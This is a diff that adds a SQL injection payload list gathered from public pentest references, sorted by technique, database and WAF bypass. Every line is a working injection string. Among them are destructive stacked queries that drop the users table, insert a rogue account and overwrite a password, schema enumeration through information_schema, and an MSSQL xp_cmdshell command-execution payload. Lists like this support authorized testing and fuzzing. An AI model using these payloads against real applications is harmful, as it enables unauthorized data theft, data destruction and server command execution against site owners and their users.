@@ -1,0 +1,69 @@
+# SQLi Payloads — Error + Blind + Time-based
+# Sources: PortSwigger, PayloadsAllTheThings, HackTricks
+
+# Error-based
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+" OR 1=1#
+') OR 1=1--
+") OR 1=1--
+') OR '1'='1
+") OR "1"="1
+' UNION SELECT NULL--
+" UNION SELECT NULL--
+
+# Blind Boolean
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT 1 FROM users LIMIT 1)=1--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND SUBSTRING((SELECT version()),1,1)='5'--
+
+# Time-based
+' WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5)--
+' OR (SELECT SLEEP(5))--
+'; WAITFOR DELAY '0:0:5'--
+"; WAITFOR DELAY '0:0:5'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR (SELECT SLEEP(5) FROM dual WHERE 1=1)--
+'; SELECT SLEEP(5)--
+" OR SLEEP(5)--
+
+# Union-based
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--
+
+# Stacked queries
+'; DROP TABLE users;--
+'; INSERT INTO users VALUES ('hacker','pass');--
+'; UPDATE users SET password='hacked' WHERE id=1;--
+
+# PostgreSQL
+' || pg_sleep(5)--
+' AND 1=2 UNION SELECT version(),NULL,NULL--
+' AND (SELECT 1 FROM pg_sleep(5))=1--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+'; EXEC xp_cmdshell 'whoami';--
+
+# Oracle
+' || DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+
+# WAF Bypass
+'/**/OR/**/1=1--
+'/**/UNION/**/SELECT/**/NULL--
+'%20OR%201=1--
+'+OR+1=1--
+'||'1'='1
+'||1=1--
